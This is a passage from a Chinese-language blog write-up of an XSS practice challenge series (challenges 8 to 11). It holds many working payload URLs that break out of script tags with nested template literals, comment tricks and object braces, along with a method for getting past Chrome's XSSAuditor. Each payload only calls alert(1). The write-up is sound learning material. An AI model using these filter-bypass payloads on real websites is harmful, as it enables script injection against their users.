src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuia57pzfj310g09a0u1.jpg" alt="8-3.png"></p><p>但实际上可以调换位置，把<code>&lt;script &gt;</code>直接作为外面的script标签解析，可以短一点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E</span><br><span class="line"></span><br><span class="line">p1g3、zeddy payload:</span><br><span class="line">&lt;!--&lt;/script&gt;&lt;script &gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="绕过谷歌XSS过滤器-XSSAuditor"><a href="#绕过谷歌XSS过滤器-XSSAuditor" class="headerlink" title="绕过谷歌XSS过滤器-XSSAuditor"></a>绕过谷歌XSS过滤器-XSSAuditor</h3><p>这一步骤在该题其实并非必须步骤，按照出题者的原话说，上述的payload在谷歌浏览器的旧版本是不可以使用的，<a href="https://zhuanlan.zhihu.com/p/74288648" target="_blank" rel="noopener">新版本xssAuditor被关闭</a>了，所以可以直接弹框。这里简单看看如何绕过xssAuditor吧。首先了解下<a href="https://blog.csdn.net/yanghuan313/article/details/53565545" target="_blank" rel="noopener">谷歌浏览器的xssAuditor</a>，大致过滤逻辑如下：</p><ol><li>GET或POST请求中的参数内容原样出现在输出的页面中</li><li>内容包括一些敏感的危险标签和属性就会执行过滤，拒绝执行。</li></ol><p>那么绕过思路也对应着在<strong>使输出内容跟输入内容不一致</strong>，<strong>绕过黑名单的检测</strong>，历史上也有很多针对<a href="https://www.leavesongs.com/chrome-xss-auditor-bypass-collection.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">谷歌浏览器的绕过方式</a>。</p><p>回到这题本身，除了用一些通用的绕过方式，还可以根据当前过滤环境给出如下香草的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3C/script%3E%3Cscript%20%3E%22=alert(1)%3C/script%3E</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">&lt;!--&lt;/script&gt;&lt;script &gt;&quot;=alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以关注到，只是加了一个<code>&quot;=</code>，结合上过滤规则是会替换<code>&quot;</code>为<code>px_xss</code>，这样完成了参数中的数据跟输出的结果不一致了。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuiadipk6j30zb09hab9.jpg" alt="8-4-绕过XSS.png"></p><h3 id="使用模板字符串的思路"><a href="#使用模板字符串的思路" class="headerlink" title="使用模板字符串的思路"></a>使用模板字符串的思路</h3><blockquote><p>请做完第九题，第十题再回来这边</p></blockquote><p>做完第十题，再回过头会发现这题跟第十题的情况是相似的，都是第三个输出点存在截断。</p><p>那么这题应该也是可以使用模板字符串的思路，直接使用第十题的payload看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=`&#125;\%27-&#123;a:`&#125;-alert(1)//$&#123;`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuib9bag3j31jn0pk0va.jpg" alt="8-2-1.png"></p><p>大失败。但是从页面来看又完全没有问题，同时把这段JS放到命令栏中是可以弹框的？</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuibes838j31q40k440p.jpg" alt="8-2-2.png"></p><p>那么问题肯定是出在其他地方，对比下和第10题的返回页面，就会发现区别在于缺少<code>&lt;/script&gt;</code>。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuibj9dyyj310i0iimyc.jpg" alt="8-2-3.png"></p><p>在不修改结构的情况下，想办法引入一个即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=`&#125;\%27-&#123;a:`&#125;-alert(1)//&lt;/script&gt;$&#123;`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuibovcpvj31hj0a53z7.jpg" alt="8-2-4.png"></p><p>完美。</p><p>其他老哥的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">出题人WP：</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=\%27-&#123;a:`&#125;-alert(1)//%3C/script%3E`&#125;-&#123;a:`$&#123;`%3C!--%3Cscript%20%3E</span><br><span class="line">gainover：</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=\%27-&#123;a:`&#125;-alert(1)//%3C/script%3E%3C!--%3Cscript%20%3E`&#125;-&#123;c:`$&#123;`</span><br><span class="line">香草：</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=`&#125;-alert(1)//%3C/script%3E`&#125;-&#123;a:`$&#123;`\%27-&#123;a:`&#125;$&#123;`%3C!--%20%3Cscript%20%3E</span><br><span class="line">huuu：</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=`&#125;//%3C/script%3E1111111`-alert(1)-&#123;a:`$&#123;`\%27-`&#125;$&#123;`%3C!--%3Cscript%20%3E</span><br></pre></td></tr></table></figure><h2 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest9/?px=123" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest9/?px=123</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://px1624.sinaapp.com/test/xsstest9/?px=<span class="tag">&lt;&gt;</span>+-*/%26|~^%25!%3f%3d`'"1234</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'\&lt;\&gt; -*\/&amp;|~^%!?=`\'\"1234'</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px1624=<span class="string">'\&lt;\&gt; -*\/&amp;|~^%!?=`\'\"1234'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~9</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>&amp;lt;&amp;gt; -*/&amp;amp;|~^%!?=`'&amp;quot;123<span class="tag">&lt;/<span class="name">div</span>&gt;</span>//这里4被吃了，说明长度限制</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>&amp;lt;&amp;gt; -*/&amp;amp;|~^%!?=`'&amp;quot;123<span class="tag">&lt;/<span class="name">div</span>&gt;</span>//这里4被吃了，说明长度限制</span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">'px'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li><p>延续之前知识点</p></li><li><p>模板字符串的嵌套：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`abc<span class="subst">$&#123;<span class="string">`def`</span>&#125;</span>`</span></span><br><span class="line"><span class="comment">//abcdef</span></span><br></pre></td></tr></table></figure></li></ul><ul><li>闭合大括号的方式：对象等</li></ul><p>基础payload一样一砸，会发现这题跟第八题输出点、过滤规则大致都一致。回顾第八题我们思考了两种思路去解决：</p><ol><li><p>突破第一个<code>&lt;/script&gt;</code>标签，把所有输入点拉入战局，尝试在JS中构造一个合法的语句。但是无法因为总是多出<code>\</code>无法解决</p></li><li><p>突破全部<code>&lt;/script&gt;</code>标签，自己重新起一个script标签，然后写入语句，成功</p></li></ol><p>再看这里的输出点过滤，对于之前利用处的第四处输出同样进行了html编码，这样我们就无法引入一个<code>&lt;script&gt;</code>标签，进行弹框。</p><p>同时还在第三处第四处进行了<strong>长度限制</strong>，只允许20个字符显示，那就要硬怼我们刚才对不过去的第一条路。</p><p>回顾我们之所以做不过去的原因：我们所有列出的注释符号都会引入<code>\</code>进行注释；我们尝试闭合也会因为<code>\</code>。那么有没有不被注释的可以利用的多行注释呢，其实是有的：<strong>模板字符串</strong>。</p><p>但是我们在利用的时候会发现有问题，先梳理payload需要满足的基本格式：</p><ul><li>必须拥有闭合单引号的<code>\&#39;</code></li><li>用于多行注释的<code>反引号</code></li><li>必须拥有的突破script标签的：<code>&lt;!--&lt;script &gt;</code>：可以放在后面反引号中，也可以放前面单引号的闭合里面。</li><li>同时需要提前注意在第三行第四行存在长度限制，我们是可以利用长度限制，去吃掉我们payload后面不想要的字符的。</li></ul><p>接下来来根据当前环境确定payload中需要拥有的<code>反引号</code>数量，这很关键，其实我们可以直接从闭合角度去确认数量，而不是无脑尝试，根据第一个跟第二个闭合，第三个跟第四个闭合的语法，可以分成两种情况：</p><ol><li>payload中引入偶数个反引号：这明显不可能，因为偶数个的话在输出点就会行程，本行跟本行的闭合跟我们设想的跨行闭合背道而驰，直接PASS</li><li>payload中引入奇数个反引号：1，3，5，奇数个反引号会现在内部闭合，留下一个单引号到下一行闭合，这样就形成了跨行。但是我们会发现奇+奇=偶，这样前两行就会完成全部的闭合，第二行到第三行中间乱七八糟的字符就只能暴露出来，形成报错。相当于能跨行，但是幅度还是不够。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=\&apos;-`&lt;!--&lt;script%20&gt;</span><br><span class="line"></span><br><span class="line">payload:\&apos;-`&lt;!--&lt;script &gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuiby7n1mj30wq0admyn.jpg" alt="9-0.png"></p><h3 id="模板字符串的嵌套"><a href="#模板字符串的嵌套" class="headerlink" title="模板字符串的嵌套"></a>模板字符串的嵌套</h3><p>跨行幅度不够，跨行幅度不够，其实我们就是烦恼模板字符串的匹配跟<code>()、{}</code>这类的不一样，结束太早了。</p><p>其实可以使用：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener"><strong>模板字符串的嵌套</strong></a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`abc<span class="subst">$&#123;<span class="string">`def`</span>&#125;</span>`</span></span><br><span class="line"><span class="comment">//abcdef</span></span><br></pre></td></tr></table></figure><p>发现所需要用到的<strong>反引号</strong>、<strong>$</strong>、<strong>{</strong>、<strong>}</strong>恰好均不会被注释，很棒，进行尝试，老样子先定闭合，我们有4行输出，想到两种闭合形式：</p><ul><li><strong>递归闭合</strong>，即第一行的第一个前反引号，到最后一行的最后一个后引号才完成闭合，整个行程一个整体</li><li><strong>前后行闭合</strong>，即这行的前反引号，在后一行的开头即闭合，上下行行程闭环。</li></ul><p>我们先看一下递归分析：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`abc<span class="subst">$&#123; <span class="string">`d<span class="subst">$&#123; <span class="string">`e<span class="subst">$&#123; <span class="string">`f`</span> &#125;</span>`</span> &#125;</span>`</span> &#125;</span>`</span></span><br><span class="line"><span class="comment">//abcdef</span></span><br><span class="line"><span class="comment">//左反引号4个，右反引号4个</span></span><br><span class="line"><span class="comment">//左开口3个，右闭口3个</span></span><br></pre></td></tr></table></figure><p>根据各行的特性，大致拟定下左侧开口和闭合数量，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">闭合  开口</span><br><span class="line">0      3   //利用单引号作为字符串解析吃掉闭合</span><br><span class="line">2      3</span><br><span class="line">2      0   //利用长度截断吃掉开口</span><br><span class="line">2      0   //利用长度截断吃掉开口</span><br></pre></td></tr></table></figure><p>尝试测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=`&#125;`&#125;\&apos;-`&lt;!--&lt;script%20&gt;$&#123;`$&#123;`$&#123;`</span><br><span class="line"></span><br><span class="line">payload:`&#125;`&#125;\&apos;-`&lt;!--&lt;script &gt;$&#123;`$&#123;`$&#123;`</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuic5xr2tj30x70aiabg.jpg" alt="9-1.png"></p><p>问题在第二行直接暴露，我们只考虑左右闭合的话，<strong>中间的语法问题根本没法解决</strong>。</p><p>同时也可以知道因为反引号数量是比开头闭口数量要多的，上一行的开头左反引号进入到下一行会打乱布局。</p><p>我们换<strong>前后行闭合</strong>的思路尝试解决这个问题：</p><p>前后行闭合：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`abc<span class="subst">$&#123;<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">`</span>&#125;</span>`</span>-<span class="string">`abc<span class="subst">$&#123;<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">`</span>&#125;</span>`</span>-<span class="string">`abc<span class="subst">$&#123;<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">`</span>&#125;</span>`</span>-<span class="string">`abc<span class="subst">$&#123;<span class="string">` //最后一行好像有问题到时候再说</span></span></span></span><br></pre></td></tr></table></figure><p>测试到头也只能如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=\&apos;-`&#125;`-`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuiccmyz5j30ud09jgmq.jpg" alt="9-2.png"></p><p>出现了最后一行的问题最后的语法没法闭合，尝试用长度去截断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=\&apos;-`&#125;111111111111111`-`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuici9m6dj30r40a175c.jpg" alt="9-4.png"></p><blockquote><p>这里会发现闭合关系结合了我们之前的<strong>递归闭合</strong>和<strong>上下行闭合</strong></p></blockquote><p>闭合了，但是出现了我们没法在大括号这里写入语句，简而言之就是<strong>多出了一个大括号</strong>。</p><p>其实我们在梳理闭合反引号和闭合大括号数量的时候就发现了这个<strong>数量不一致</strong>的问题，最后会导致语法错误。</p><p>所以我们必须要引入什么其他语法结构来闭合大括号。</p><h3 id="函数、语法、对象闭合大括号"><a href="#函数、语法、对象闭合大括号" class="headerlink" title="函数、语法、对象闭合大括号"></a>函数、语法、对象闭合大括号</h3><p><code>function(){}</code>、<code>if(){}</code>、<code>{a:123}</code>，出题者WP给出了JS语法中三种闭合大括号的方式。由于前两者会引入一些语法结构问题，而对象会比较简单，也可以作为表达式的一部分。所以选取<strong>对象结构</strong>来进行括号填补。</p><p>至此 构建payload的所有要素就齐全了，引入对象，把右边的模板字符串写成对象的形式好了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=\&apos;-`&#125;111111111111111`-&#123;a:`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuicmzcg7j30tt09e3zm.jpg" alt="9-5.png"></p><p>前面没有报错！在报错的地方引入payload！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=\&apos;-`&#125;-alert(1)//1111`-&#123;a:`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuicqr01xj30t509ijso.jpg" alt="9-6.png"></p><p>成了成了！下面这些报错不重要！！因为如同之前所说的<code>&lt;script&gt;&#39;px&#39;</code>标签会被解析为小于 script这个变量大于’px’，大概如下，虽然会执行报错但是解析是正确的，就可以执行成功。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> px=<span class="string">''</span>-alert(<span class="number">1</span>)&lt;script&gt;<span class="string">'px'</span></span><br></pre></td></tr></table></figure><p>拉过去浏览器！失败….没弹框…..</p><p>仔细看看代码会发现存在一个闭合问题：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuid1hcjoj31bg0flgr4.jpg" alt="9-flase.png"></p><p>那么在这个位置加上闭合，那么考虑第一行的语法情况，在前面也需要把大括号闭合了，再引入一个对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=\&apos;-&#123;a:`&#125;-alert(1)//1111`&#125;-&#123;a:`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuicvv6qsj30uo09omyi.jpg" alt="9-7.png"></p><p>成了！！！！！！！！</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuid8d05dj31ii0dkq3n.jpg" alt="9-8.png"></p><p>看了下发现跟官方WP的答案如出一辙…..不亏虽然没看答案但是一路偷看思路的我….</p><p>看看其他老哥的WP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Huuu:</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=1111111111111111`&#125;//`-alert(1)-&#123;a:`$&#123;`\%27-`&#125;$&#123;`%3C!--%3Cscript%20%3E</span><br><span class="line">//这个payload有一点类似，想办法只因入了一个对象，就不存在我们之前以为闭合成功了，然后再加一个对象的那一步</span><br><span class="line">香草：</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest9/?px=`&#125;-alert(1)//`&#125;-&#123;a:`$&#123;`\%27-&#123;a:`&#125;$&#123;`%3C!--%20%3Cscript%20%3E</span><br></pre></td></tr></table></figure><h2 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest10/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest10/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'12345'</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px1624=<span class="string">'12345'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~10</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>12<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="string">"px"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>延续之前知识点，知识构造方法不同，没有新知识点</li></ul><p>跟之前的应该变化不大，先用之前的payload探探路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=\&apos;-&#123;a:`&#125;-alert(1)//1111`&#125;-&#123;a:`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuide3o9bj314u0c2mym.jpg" alt="10-0.png"></p><p>发现有以下改变：</p><ul><li>第三处限制输出2个字符</li><li>第四处不限制输出字符数</li></ul><p>仔细观察第九题的payload输出结果，会发现当前payload输出实际上变成了<strong>同一个payload在三个地方输出，知识第三个地方的过滤规则跟之前两处不同</strong>，前面是转义，后面是html编码</p><p>这种情景就陷入了我们之前说的<strong>三行之间前后行闭合</strong>的情况：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>-&#123;<span class="attr">a</span>:<span class="string">``</span>&#125;-&#123;<span class="attr">a</span>:<span class="string">`<span class="subst">$&#123;<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">       `</span>&#125;</span>`</span>&#125;-&#123;<span class="attr">a</span>:<span class="string">`<span class="subst">$&#123;<span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">   `</span>&#125;</span>`</span>&#125;-&#123;<span class="attr">a</span>:<span class="string">`<span class="subst">$&#123;<span class="string">`</span></span></span></span><br></pre></td></tr></table></figure><p>之前的前后行闭合还可以使用<strong>长度截断</strong>来<strong>改变最后语法</strong>，从而突破。但是这里我们没法动，因为我们只要改动payload，想在第三行正常结束，那么他就会在第二行结束。因为两者输出是一样的。</p><p>也不是完全一样的，因为这两者之间<strong>过滤规则不同</strong>。</p><p>那么我们是否可以找到一个payload，利用过滤规则，让JS第二行正常闭合，开启，但是在第三行完成语法修正，比如..注释符？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=\&apos;-&#123;a:`&#125;-alert(1)//1111`&#125;//-&#123;a:`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuidhrr4jj314x0afq4g.jpg" alt="10-1.png"></p><p>怎么尝试都不可以，为了语法正确，都只能在已有对象之外加入注释符，但是这些被转移的注释符都会在前两行出错。</p><h3 id="让截断处起到改变语法的作用"><a href="#让截断处起到改变语法的作用" class="headerlink" title="让截断处起到改变语法的作用"></a>让截断处起到改变语法的作用</h3><p>换条思路，我们的目的就是为了<strong>让第四行改变语法</strong>，想办法利用起第三行的被截取的两个字符来<strong>改变语法</strong>。</p><p><strong>比如提前闭合对象，从而释放出之后的第四行的原来被关在模板字符串里面的注释符//</strong>。</p><p>那么我们的payload就要以<code>反引号}</code>开头，根据这个要求修改payload再把弹框和占位都去掉，看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=`&#125;\&apos;-&#123;a:`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuie1h1joj30zf0bmwfr.jpg" alt="10-2.png"></p><p>为了第二行的语法正确，我们可以再引入一个嵌套的模板字符串，把<strong>单引号</strong>放入到模板字符串中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=`&#125;\&apos;-&#123;a:`$&#123;`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuie6bsbmj30xq0bfdh2.jpg" alt="10-3.png"></p><p>右边加了开口，但是左边没有加闭口，在报错位置加上闭口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=`&#125;\&apos;-&#123;a:`&#125;-$&#123;`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuihuapb0j30ze0bt0u0.jpg" alt="10-4.png"></p><p>第三行的闭合符号将语法提前闭合！导致后面报错，那么引入注释符！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=`&#125;\&apos;-&#123;a:`&#125;-//$&#123;`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuifhsu9lj313f0bowfu.jpg" alt="10-5.png"></p><p>最后引入弹框语句！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=`&#125;\%27-&#123;a:`&#125;-alert(1)//$&#123;`$&#123;`&lt;!--&lt;script%20&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkuifmv1uyj31gl0bsjs1.jpg" alt="10-6.png"></p><p>舒服了——舒服了——舒服了！</p><p>看看其他师傅payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">出题人WP：</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=`&#125;\%27-&#123;a:`&#125;-alert(1)//`&#125;-&#123;a:`$&#123;`$&#123;`&lt;!--&lt;script%20&gt;</span><br><span class="line">跟我的不一样，好像好像我的比他要好一点？</span><br><span class="line">香草：</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=`&#125;-alert(1)//&lt;/script&gt;`&#125;-&#123;a:`$&#123;`\%27-&#123;a:`&#125;$&#123;`&lt;!--&lt;script%20&gt;</span><br><span class="line">使用的是第一行一处嵌套，第二行两处嵌套的方式，思路有点不通</span><br><span class="line">Huuu：</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest10/?px=`&#125;//`-alert(1)-&#123;a:`$&#123;`\%27-`&#125;$&#123;`&lt;!--&lt;script%20&gt;</span><br><span class="line">非常骚气的姿势</span><br></pre></td></tr></table></figure><p>但是我不管我不听我不听，我的payload是最短的43个字符，假装很厉害QAQ</p><h2 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h2><blockquote><p>十一十二题，应该参考于<a href="https://renwax23.github.io/X/chal/oct22/" target="_blank" rel="noopener">国外老哥的题目</a>，payload参考原题解，最短payload参考huuu</p></blockquote><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest11/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest11/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>alert(11) to win<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(location.pathname)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span 